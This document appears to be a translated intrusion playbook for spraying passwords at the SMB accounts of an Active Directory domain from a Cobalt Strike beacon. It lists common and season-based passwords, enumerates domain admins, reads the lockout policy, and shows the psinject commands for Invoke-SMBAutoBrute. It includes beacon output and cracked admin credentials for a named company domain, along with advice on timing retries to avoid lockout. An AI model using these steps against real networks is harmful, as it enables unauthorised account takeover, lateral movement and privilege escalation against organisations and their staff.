```SMB AUTOBRUT
The input data for the conduct of this attack are only passwords.
   - those that have come down with the Browser CharpChrome
   - those that have sold seatbeltom
   - those that have been scrapped in the process of carrying out work within the network (mimicry etc.)
And in general any others, for example found recorded in files

If there are fewer such passwords than we can launch a brute force attack, we boldly supplement them from the following list of the most common in the corporate environment.

Password1
Hello123
password
Welcome1
banco@1
training
Password123
job12345
spring
food1234

We also recommend that you use password lists based on the seasons and the current year. Given that passwords change every three months - you can take a "stock" to generate such a sheet.
for example in august 2020 we create the following list

June2020
July2020
August20
August2020
Summer20
Summer2020
June2020!
July2020!
August20!
August2020!
Summer20!
Summer2020!

All passwords above fall either in 3 out of 4 requirements for Active Directory passwords (which is enough for users to install them), or in all 4 requirements.
Note. consider the most popular version of the requirements.

Scenario with domain administrators
1. Collect a list of domain administrators with the shell net group command "domain admins" /dom
   The received data is recorded in a file
   admins.txt
   
2. Upload this file to the host in the folder C:ProgramData

3. We request information on the domain policy of blocking accounts (protection against brute force)
   beacon> shell net accounts /dom
   

    Tasked beacon to run: net accounts /dom
    host called home, sent: 48 bytes
    received output:


   The request will be processed at a domain controller for domain shookconstruction.com.
   Force user logoff how long after time expires?:       Never
   Minimum password age (days):                          1
   Maximum password age (days):                          42
   Minimum password length:                              6
   Length of password history maintained:                24
   Lockout threshold:                                    Never
   Lockout duration (minutes):                           30
   Lockout observation window (minutes):                 30
   Computer role:                                        BACKUP


   We are interested in the Lockout threshold parameter which most often contains a certain numeric value that we should use as a parameter in the future (in this case it is Never - which means that password brute force protection is disabled.
   In this guide, in the future, we will indicate the value of 5 as approximately the most common one.
   The Minimum password length parameter specifies the minimum number of password characters allowed to filter our "list" of passwords that we will set.
   
4. In the source code of the script, specify the domain in which the script will be run
   - string $context = new-object System.DirectoryServices.ActiveDirectory.DirectoryContext("Domain","shookconstruction.com")

5. Import and run the script
   powershell-import /tmp/Fast-Guide/Invoke-SMBAutoBrute.ps1
   psinject 4728 x86 Invoke-SMBAutoBrute -UserList "C:ProgramDataadmins.txt" -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5 -ShowVerbose
   - 4728 in this case is the current pid, and x86 is its bitness
   - The list of passwords consists of one that we had "found" and two from the list of popular passwords
6. Watch the progress of the script and see the result
   
Success! Username: Administrator. Password: 1qazXDR%+
    Success! Username: CiscoDirSvcs. Password: 1qazXDR%+

We've messed up two domain admins.
   
========================================================================


The scenario without specifying a list of users differs in only two ways.
   -   psinject 4728 x86 Invoke-SMBAutoBrute -PasswordList "Password1, Welcome1, 1qazXDR%+" -LockoutThreshold 5
      We don't specify the UserList and ShowVerbose parameters. The absence of the first means that the search will be carried out on ALL users of the domain, the absence of the second indicates that only SUCCESSFUL results will be displayed.
   

I will not wait in the video guide for the end of the script that will sort through all the user/password pairs in the domain, I will only show the output.
   
   

    Success! Username: Administrator. Password: 1qazXDR%+
    Success! Username: CiscoDirSvcs. Password: 1qazXDR%+
    Success! Username: support. Password: 1qazXDR%+
    Success! Username: accountingdept. Password: 1qazXDR%+   


   As you can see, we were able to find accounts of other users that can be useful for further promotion on the network and raising rights.

If there is no positive result, you can repeat after a while (optimally multiply by two lockout duration parameters before the next attempt) with a new list of passwords.
   The end of the script will be marked by the output of the message in the bicon
